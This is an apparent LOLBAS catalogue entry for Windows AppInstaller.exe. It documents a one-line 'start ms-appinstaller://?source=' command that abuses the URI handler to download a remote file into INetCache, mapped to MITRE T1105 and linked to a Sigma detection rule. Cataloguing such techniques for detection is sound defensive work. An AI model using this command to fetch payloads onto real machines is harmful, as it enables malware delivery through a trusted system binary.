---
Acknowledgement:
- Person: Wade Hic
Author: Wade Hickey
Commands:
- Category: Download
  Command: start ms-appinstaller://?source={REMOTEURL:.exe}
  Description: AppInstaller.exe is spawned by the default handler for the URI, it
    attempts to load/install a package from the URL and is saved in INetCache.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from Internet
Created: 2020-12-02
Description: Tool used for installation of AppX/MSIX applications on Windows 10
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml
Full_Path:
- Path: C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe
Name: AppInstaller.exe
Resources:
- Link: https://twitter.com/notwhickey/status/1333900137232523264
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/osbinaries
---

# AppInstaller.exe

Tool used for installation of AppX/MSIX applications on Windows 10

# Path(s)

- `C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe`

# Download Commands

AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.

```batch
start ms-appinstaller://?source={REMOTEURL:.exe}
```

- **Usecase:** Download file from Internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/notwhickey/status/1333900137232523264
# Acknowledgements

- Wade Hickey (Authored, 2020-12-02)
- Wade Hic